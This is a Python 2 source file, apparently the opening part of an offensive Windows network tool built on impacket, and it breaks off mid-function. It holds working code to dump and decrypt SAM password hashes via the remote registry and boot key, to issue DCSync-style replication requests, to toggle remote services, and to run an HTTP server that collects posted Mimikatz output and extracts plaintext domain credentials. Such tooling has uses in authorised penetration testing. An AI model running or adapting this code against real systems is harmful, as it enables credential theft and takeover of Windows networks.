#!/usr/bin/env python2

#This must be one of the first imports or else we get threading error on completion
from gevent import monkey
monkey.patch_all()

from gevent import sleep
from gevent.pool import Pool
from gevent import joinall
from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
from threading import Thread
from base64 import b64encode
from struct import unpack, pack
from collections import OrderedDict
from impacket import smbserver, ntlm, winregistry, uuid, ImpactPacket
from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp, tsch, srvs, wkst, epm, lsat, lsad, dtypes
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL, OWNER_SECURITY_INFORMATION, MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.ese import ESENT_DB
from impacket.structure import Structure
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.nmb import NetBIOSError
from impacket.smbconnection import *
from BaseHTTPServer import BaseHTTPRequestHandler
from argparse import RawTextHelpFormatter
from binascii import unhexlify, hexlify
from Crypto.Cipher import DES, ARC4
from datetime import datetime
from time import ctime, time, strftime, gmtime
from termcolor import cprint, colored

import StringIO
import csv
import ntpath
import socket
import hashlib
import codecs
import BaseHTTPServer
import logging
import argparse
import traceback
import ConfigParser
import random
import sys
import os
import string

PERM_DIR = ''.join(random.sample(string.ascii_letters, 10))
OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
SMBSERVER_DIR   = 'served_over_smb'
DUMMY_SHARE     = 'TMP'

print_error  = lambda x: cprint("[-] ", 'red', attrs=['bold'], end=x+'\n')
print_status = lambda x: cprint("[*] ", 'blue', attrs=['bold'], end=x+'\n')
print_succ   = lambda x: cprint("[+] ", 'green', attrs=['bold'], end=x+'\n')
print_att    = lambda x: cprint(x, 'yellow', attrs=['bold'])
yellow = lambda x: colored(x, 'yellow', attrs=['bold'])
green  = lambda x: colored(x, 'green', attrs=['bold'])
red    = lambda x: colored(x, 'red', attrs=['bold'])

# Structures
# Taken from http://insecurety.net/?p=768
class SAM_KEY_DATA(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('Salt','16s=""'),
        ('Key','16s=""'),
        ('CheckSum','16s=""'),
        ('Reserved','<Q=0'),
    )

class DOMAIN_ACCOUNT_F(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Unknown','<L=0'),
        ('CreationTime','<Q=0'),
        ('DomainModifiedCount','<Q=0'),
        ('MaxPasswordAge','<Q=0'),
        ('MinPasswordAge','<Q=0'),
        ('ForceLogoff','<Q=0'),
        ('LockoutDuration','<Q=0'),
        ('LockoutObservationWindow','<Q=0'),
        ('ModifiedCountAtLastPromotion','<Q=0'),
        ('NextRid','<L=0'),
        ('PasswordProperties','<L=0'),
        ('MinPasswordLength','<H=0'),
        ('PasswordHistoryLength','<H=0'),
        ('LockoutThreshold','<H=0'),
        ('Unknown2','<H=0'),
        ('ServerState','<L=0'),
        ('ServerRole','<H=0'),
        ('UasCompatibilityRequired','<H=0'),
        ('Unknown3','<Q=0'),
        ('Key0',':', SAM_KEY_DATA),
# Commenting this, not needed and not present on Windows 2000 SP0
#        ('Key1',':', SAM_KEY_DATA),
#        ('Unknown4','<L=0'),
    )

# Great help from here http://www.beginningtoseethelight.org/ntsecurity/index.htm
class USER_ACCOUNT_V(Structure):
    structure = (
        ('Unknown','12s=""'),
        ('NameOffset','<L=0'),
        ('NameLength','<L=0'),
        ('Unknown2','<L=0'),
        ('FullNameOffset','<L=0'),
        ('FullNameLength','<L=0'),
        ('Unknown3','<L=0'),
        ('CommentOffset','<L=0'),
        ('CommentLength','<L=0'),
        ('Unknown3','<L=0'),
        ('UserCommentOffset','<L=0'),
        ('UserCommentLength','<L=0'),
        ('Unknown4','<L=0'),
        ('Unknown5','12s=""'),
        ('HomeDirOffset','<L=0'),
        ('HomeDirLength','<L=0'),
        ('Unknown6','<L=0'),
        ('HomeDirConnectOffset','<L=0'),
        ('HomeDirConnectLength','<L=0'),
        ('Unknown7','<L=0'),
        ('ScriptPathOffset','<L=0'),
        ('ScriptPathLength','<L=0'),
        ('Unknown8','<L=0'),
        ('ProfilePathOffset','<L=0'),
        ('ProfilePathLength','<L=0'),
        ('Unknown9','<L=0'),
        ('WorkstationsOffset','<L=0'),
        ('WorkstationsLength','<L=0'),
        ('Unknown10','<L=0'),
        ('HoursAllowedOffset','<L=0'),
        ('HoursAllowedLength','<L=0'),
        ('Unknown11','<L=0'),
        ('Unknown12','12s=""'),
        ('LMHashOffset','<L=0'),
        ('LMHashLength','<L=0'),
        ('Unknown13','<L=0'),
        ('NTHashOffset','<L=0'),
        ('NTHashLength','<L=0'),
        ('Unknown14','<L=0'),
        ('Unknown15','24s=""'),
        ('Data',':=""'),
    )

class NL_RECORD(Structure):
    structure = (
        ('UserLength','<H=0'),
        ('DomainNameLength','<H=0'),
        ('EffectiveNameLength','<H=0'),
        ('FullNameLength','<H=0'),
        ('MetaData','52s=""'),
        ('FullDomainLength','<H=0'),
        ('Length2','<H=0'),
        ('CH','16s=""'),
        ('T','16s=""'),
        ('EncryptedData',':'),
    )


class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (
        ('Value','6s'),
    )

class SAMR_RPC_SID(Structure):
    structure = (
        ('Revision','<B'),
        ('SubAuthorityCount','<B'),
        ('IdentifierAuthority',':',SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
        ('SubLen','_-SubAuthority','self["SubAuthorityCount"]*4'),
        ('SubAuthority',':'),
    )

    def formatCanonical(self):
       ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5]))
       for i in range(self['SubAuthorityCount']):
           ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
       return ans

class MimikatzServer(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path[1:] in os.listdir('served_over_http'):
            self.send_response(200)
            self.end_headers()
            with open('served_over_http/'+ self.path[1:], 'r') as script:
                self.wfile.write(script.read())

        elif args.path:
            if self.path[1:] == args.path.split('/')[-1]:
                self.send_response(200)
                self.end_headers()
                with open(args.path, 'rb') as rbin:
                    self.wfile.write(rbin.read())

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers.getheader('content-length'))
        data = self.rfile.read(length)

        if args.mimikatz:
            buf = StringIO.StringIO(data).readlines()
            i = 0
            while i < len(buf):
                if ('Password' in buf[i]) and ('(null)' not in buf[i]):
                    passw  = buf[i].split(':')[1].strip()
                    domain = buf[i-1].split(':')[1].strip()
                    user   = buf[i-2].split(':')[1].strip()
                    print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
                i += 1

        elif args.mimi_cmd:
            print data

        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
        with open('logs/' + log_name, 'w') as creds:
            creds.write(data)
        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','yomama')
        smbConfig.set('global','server_os','REDSTAR')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file', 'smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)

        self.smb.processConfigFile()
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class OfflineRegistry:
    def __init__(self, hiveFile = None, isRemote = False):
        self.__hiveFile = hiveFile
        if self.__hiveFile is not None:
            self.__registryHive = winregistry.Registry(self.__hiveFile, isRemote)

    def enumKey(self, searchKey):
        parentKey = self.__registryHive.findKey(searchKey)

        if parentKey is None:
            return

        keys = self.__registryHive.enumKey(parentKey)

        return keys

    def enumValues(self, searchKey):
        key = self.__registryHive.findKey(searchKey)

        if key is None:
            return

        values = self.__registryHive.enumValues(key)

        return values

    def getValue(self, keyValue):
        value = self.__registryHive.getValue(keyValue)

        if value is None:
            return

        return value

    def getClass(self, className):
        value = self.__registryHive.getClass(className)

        if value is None:
            return

        return value

    def finish(self):
        if self.__hiveFile is not None:
            # Remove temp file and whatever else is needed
            self.__registryHive.close()

class SAMHashes(OfflineRegistry):
    def __init__(self, samFile, bootKey, isRemote = True):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def getHBootKey(self):
        #logging.debug('Calculating HashedBootKey from SAM')
        QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = "0123456789012345678901234567890123456789\0"

        F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]

        domainData = DOMAIN_ACCOUNT_F(F)

        rc4Key = self.MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)

        rc4 = ARC4.new(rc4Key)
        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])

        # Verify key with checksum
        checkSum = self.MD5( self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

        if checkSum != self.__hashedBootKey[16:]:
            raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')

    def __decryptHash(self, rid, cryptedHash, constant):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
        rc4 = ARC4.new(rc4Key)
        key = rc4.encrypt(cryptedHash)

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

    def dump(self):
        NTPASSWORD = "NTPASSWORD\0"
        LMPASSWORD = "LMPASSWORD\0"

        if self.__samFile is None:
            # No SAM file provided
            return

        sam_hashes = []

        #logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
        self.getHBootKey()

        usersKey = 'SAM\\Domains\\Account\\Users'

        # Enumerate all the RIDs
        rids = self.enumKey(usersKey)
        # Remove the Names item
        try:
            rids.remove('Names')
        except:
            pass

        for rid in rids:
            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
            rid = int(rid,16)

            V = userAccount['Data']

            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

            if userAccount['LMHashLength'] == 20:
                encLMHash = V[userAccount['LMHashOffset']+4:userAccount['LMHashOffset']+userAccount['LMHashLength']]
            else:
                encLMHash = ''

            if userAccount['NTHashLength'] == 20:
                encNTHash = V[userAccount['NTHashOffset']+4:userAccount['NTHashOffset']+userAccount['NTHashLength']]
            else:
                encNTHash = ''

            lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD)
            ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD)

            if lmHash == '':
                lmHash = ntlm.LMOWFv1('','')
            if ntHash == '':
                ntHash = ntlm.NTOWFv1('','')

            answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash), hexlify(ntHash))
            self.__itemsFound[rid] = answer
            sam_hashes.append(answer)

        return sam_hashes

    def export(self, fileName):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = open(fileName+'.sam','w+')
            for item in items:
                fd.write(self.__itemsFound[item]+'\n')
            fd.close()

class CryptoCommon:
    # Common crypto stuff used over different classes
    def transformKey(self, InputKey):
        # Section 2.2.11.1.2 Encrypting a 64-Bit Block with a 7-Byte Key
        OutputKey = []
        OutputKey.append( chr(ord(InputKey[0]) >> 0x01) )
        OutputKey.append( chr(((ord(InputKey[0])&0x01)<<6) | (ord(InputKey[1])>>2)) )
        OutputKey.append( chr(((ord(InputKey[1])&0x03)<<5) | (ord(InputKey[2])>>3)) )
        OutputKey.append( chr(((ord(InputKey[2])&0x07)<<4) | (ord(InputKey[3])>>4)) )
        OutputKey.append( chr(((ord(InputKey[3])&0x0F)<<3) | (ord(InputKey[4])>>5)) )
        OutputKey.append( chr(((ord(InputKey[4])&0x1F)<<2) | (ord(InputKey[5])>>6)) )
        OutputKey.append( chr(((ord(InputKey[5])&0x3F)<<1) | (ord(InputKey[6])>>7)) )
        OutputKey.append( chr(ord(InputKey[6]) & 0x7F) )

        for i in range(8):
            OutputKey[i] = chr((ord(OutputKey[i]) << 1) & 0xfe)

        return "".join(OutputKey)

    def deriveKey(self, baseKey):
        # 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
        # Let I be the little-endian, unsigned integer.
        # Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
        # Note that because I is in little-endian byte order, I[0] is the least significant byte.
        # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
        # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
        key = pack('<L',baseKey)
        key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
        key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
        return self.transformKey(key1),self.transformKey(key2)

class RemoteFile:
    def __init__(self, smbConnection, fileName):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__tid = self.__smbConnection.connectTree('ADMIN$')
        self.__fid = None
        self.__currentOffset = 0

    def open(self):
        self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName)

    def seek(self, offset, whence):
        # Implement whence, for now it's always from the beginning of the file
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data =  self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)
            self.__currentOffset += len(data)
            return data
        return ''

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile('ADMIN$', self.__fileName)
            self.__fid = None

    def tell(self):
        return self.__currentOffset

    def __str__(self):
        return "\\\\%s\\ADMIN$\\%s" % (self.__smbConnection.getRemoteHost(), self.__fileName)

class RemoteOperations:
    def __init__(self, smbConnection):
        self.__smbConnection = smbConnection
        self.__smbConnection.setTimeout(5*60)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__rrp = None
        self.__regHandle = None

        self.__stringBindingSamr = r'ncacn_np:445[\pipe\samr]'
        self.__samr = None
        self.__domainHandle = None
        self.__domainName = None

        self.__drsr = None
        self.__hDrs = None
        self.__NtdsDsaObjectGuid = None
        self.__doKerberos = None

        self.__bootKey = ''
        self.__disabled = False
        self.__shouldStop = False
        self.__started = False

        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__scmr = None
        self.__tmpServiceName = None
        self.__serviceDeleted = False

        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__shell = '%COMSPEC% /Q /c '
        self.__output = '%SYSTEMROOT%\\Temp\\' + OUTPUT_FILENAME
        self.__answerTMP = ''

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def connectSamr(self, domain):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
        rpc.set_smb_connection(self.__smbConnection)
        self.__samr = rpc.get_dce_rpc()
        self.__samr.connect()
        self.__samr.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(self.__samr)
        serverHandle = resp['ServerHandle']

        resp = samr.hSamrLookupDomainInSamServer(self.__samr, serverHandle, domain)
        resp = samr.hSamrOpenDomain(self.__samr, serverHandle=serverHandle, domainId=resp['DomainId'])
        self.__domainHandle = resp['DomainHandle']
        self.__domainName = domain

    def __connectDrds(self):
        stringBinding = epm.hept_map(self.__smbConnection.getRemoteHost(), drsuapi.MSRPC_UUID_DRSUAPI,
                                     protocol='ncacn_ip_tcp')
        rpc = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpc, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpc.set_credentials(*(self.__smbConnection.getCredentials()))
            rpc.set_kerberos(self.__doKerberos)
        self.__drsr = rpc.get_dce_rpc()
        self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.__doKerberos:
            self.__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__drsr.connect()
        self.__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs) #- 4
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = drsuapi.DRS_EXT_RECYCLE_BIN
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        drs['dwExtCaps'] = 0
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(str(drs))
        resp = self.__drsr.request(request)

        self.__hDrs = resp['phDrs']

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(self.__drsr, self.__hDrs, self.__domainName, 2)

        if resp['pmsgOut']['V2']['cItems'] > 0:
            self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            logging.error("Couldn't get DC info for domain %s" % self.__domainName)
            raise Exception('Fatal, aborting')

    def getDrsr(self):
        return self.__drsr

    def DRSCrackNames(self, formatOffered=drsuapi.DS_NAME_FORMAT.DS_DISPLAY_NAME,
                      formatDesired=drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name=''):
        if self.__drsr is None:
            self.__connectDrds()

        resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
        return resp

    def DRSGetNCChanges(self, userEntry):
        if self.__drsr is None:
            self.__connectDrds()

        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid

        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = drsuapi.NULLGUID
        dsName['Sid'] = ''
        dsName['NameLen'] = len(userEntry)
        dsName['StringName'] = (userEntry + '\x00')

        dsName['structLen'] = len(dsName.getData())

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        request['pmsgIn']['V8']['pPartialAttrSet'] = NULL
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = NULL

        return self.__drsr.request(request)

    def getDomainUsers(self, enumerationContext=0):
        if self.__samr is None:
            self.connectSamr(self.getMachineNameAndDomain()[1])

        try:
            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, self.__domainHandle,
                                                    userAccountControl=samr.USER_NORMAL_ACCOUNT | \
                                                                       samr.USER_WORKSTATION_TRUST_ACCOUNT | \
                                                                       samr.USER_SERVER_TRUST_ACCOUNT |\
                                                                       samr.USER_INTERDOMAIN_TRUST_ACCOUNT,
                                                    enumerationContext=enumerationContext)
        except DCERPCException, e:
            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                raise
            resp = e.get_packet()
        return resp

    def ridToSid(self, rid):
        if self.__samr is None:
            self.connectSamr(self.getMachineNameAndDomain()[1])
        resp = samr.hSamrRidToSid(self.__samr, self.__domainHandle , rid)
        return resp['Sid']

    def getMachineNameAndDomain(self):
        if self.__smbConnection.getServerName() == '':
            # No serverName.. this is either because we're doing Kerberos
            # or not receiving that data during the login process.
            # Let's try getting it through RPC
            rpc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\wkssvc]')
            rpc.set_smb_connection(self.__smbConnection)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            resp = wkst.hNetrWkstaGetInfo(dce, 100)
            dce.disconnect()
            return resp['WkstaInfo']['WkstaInfo100']['wki100_computername'][:-1], resp['WkstaInfo']['WkstaInfo100']['wki100_langroup'][:-1]
        else:
            return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()

    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain,username)
            else:
                return username
        except:
            return None

    def getServiceAccount(self, serviceName):
        try:
            # Open the service
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
            serviceHandle = ans['lpServiceHandle']
            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
            if account.startswith('.\\'):
                account = account[2:]
            return account
        except Exception, e:
            logging.error(e)
            return None

    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            logging.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            logging.debug('Service %s is already running'% self.__serviceName)
            self.__shouldStop = False
            self.__started  = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])

        # Let's check its configuration if service is stopped, maybe it's disabled :s
        if self.__started is False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                logging.info('Service %s is disabled, enabling it'% self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
            logging.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
            sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __restore(self):
        # First of all stop the service if it was originally stopped
        if self.__shouldStop is True:
            logging.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
        if self.__serviceDeleted is False:
            # Check again the service we created does not exist, starting a new connection
            # Why?.. Hitting CTRL+C might break the whole existing DCE connection
            try:
                rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % self.__smbConnection.getRemoteHost())
                if hasattr(rpc, 'set_credentials'):
                    # This method exists only for selected protocol sequences.
                    rpc.set_credentials(*self.__smbConnection.getCredentials())
                    rpc.set_kerberos(self.__doKerberos)
                self.__scmr = rpc.get_dce_rpc()
                self.__scmr.connect()
                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                # Open SC Manager
                ans = scmr.hROpenSCManagerW(self.__scmr)
                self.__scManagerHandle = ans['lpScHandle']
                # Now let's open the service
                resp = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
                service = resp['lpServiceHandle']
                scmr.hRDeleteService(self.__scmr, service)
                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
                scmr.hRCloseServiceHandle(self.__scmr, service)
                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                rpc.disconnect()
            except Exception, e:
                # If service is stopped it'll trigger an exception
                # If service does not exist it'll trigger an exception
                # So. we just wanna be sure we delete it, no need to 
                # show this exception message
                pass

    def finish(self):
        self.__restore()
        if self.__rrp is not None:
            self.__rrp.disconnect()
        if self.__drsr is not None:
            self.__drsr.disconnect()
        if self.__samr is not None:
            self.__samr.disconnect()
        if self.__scmr is not None:
            try:
                self.__scmr.disconnect()
            except SessionError:
                pass

    def getBootKey(self):
        bootKey = ''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        for key in ['JD','Skew1','GBG','Data']:
            logging.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp, keyHandle)
            bootKey = bootKey + ans['lpClassOut'][:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        bootKey = unhexlify(bootKey)

        for i in xrange(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))

        return self.__bootKey

    def checkUAC(self):
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
        keyHandle = ans['phkResult']
        dataType, uac_value = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'EnableLUA')
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        return uac_value

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']

        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
        keyHandle = ans['phkResult']
        try:
            dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
        except:
            noLMHash = 0

        if noLMHash != 1:
            logging.debug('LMHashes are being stored')
            return False

        logging.debug('LMHashes are NOT being stored')
        return True

    def __retrieveHive(self, hiveName):
        tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
        ans = rrp.hOpenLocalMachine(self.__rrp)
